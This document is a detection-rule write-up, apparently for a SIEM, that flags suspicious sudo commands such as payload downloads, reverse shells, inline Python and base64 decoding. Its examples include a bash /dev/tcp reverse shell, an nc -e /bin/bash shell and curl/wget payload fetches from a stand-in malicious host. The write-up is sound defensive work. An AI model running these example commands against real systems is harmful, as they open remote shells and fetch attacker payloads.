# Suspicious Command Execution Detection

## Objective

Detect suspicious command-line behavior that may indicate attacker activity such as payload downloads, reverse shells, or script execution.

This detection focuses on identifying behavioral patterns rather than specific malware signatures.

---

## MITRE ATT&CK Mapping

T1059 – Command and Scripting Interpreter  
T1105 – Ingress Tool Transfer  
T1140 – Deobfuscate/Decode Files or Information  

---

## Telemetry Source

sudo command logs

log file: /var/log/auth.log

example telemetry fields:

data.command
full_log

example log: COMMAND=/usr/bin/curl http://example.com/test.sh
 -o /tmp/test.sh

 
---

## Detection Logic

These rules trigger when common attacker techniques are observed in command-line arguments.

### Rule 100170 – network download activity

Detects:

curl  
wget  

example behavior:

curl http://malicious.site/payload.sh

wget http://malicious.site/script.sh


reason suspicious:
attackers frequently download payloads from external infrastructure.

---

### Rule 100171 – reverse shell patterns

Detects:

bash -i  
/dev/tcp/  
nc  
netcat  

example behavior:

bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
nc 10.0.0.1 4444 -e /bin/bash


reason suspicious:
reverse shells allow attackers to maintain remote interactive access.

---

### Rule 100172 – python inline execution

Detects:

python -c  
python3 -c  

example behavior:

python3 -c 'import socket,subprocess'


reason suspicious:
inline execution avoids writing payloads to disk.

---

### Rule 100173 – payload preparation behavior

Detects:

base64 decoding  
chmod 777  
eval usage  

example behavior:

echo payload | base64 -d
chmod 777 script.sh


reason suspicious:
attackers often decode or prepare scripts prior to execution.

---

## Rules

100170  
100171  
100172  
100173  

parent rule:

5402 – Successful sudo to ROOT executed

---

## Example Alerts Observed

rule.id = 100170  
command contains curl or wget  

rule.id = 100171  
command contains reverse shell syntax  

rule.id = 100172  
command contains python -c  

rule.id = 100173  
command contains base64 decode behavior  

---

## Lessons Learned

command-line telemetry provides strong behavioral indicators of attacker activity

common attacker patterns can be detected without knowing exact malware signatures

behavior-based detection complements file integrity monitoring

combining privilege escalation telemetry with execution patterns improves detection confidence

---

## Possible False Positives

administrators downloading legitimate scripts

developers using python inline commands

automation scripts using curl or wget

security testing activity

---

## Detection Strategy

prioritize alerts that combine:

privilege escalation  
network activity  
script execution  

multiple suspicious behaviors in sequence increases confidence of malicious activity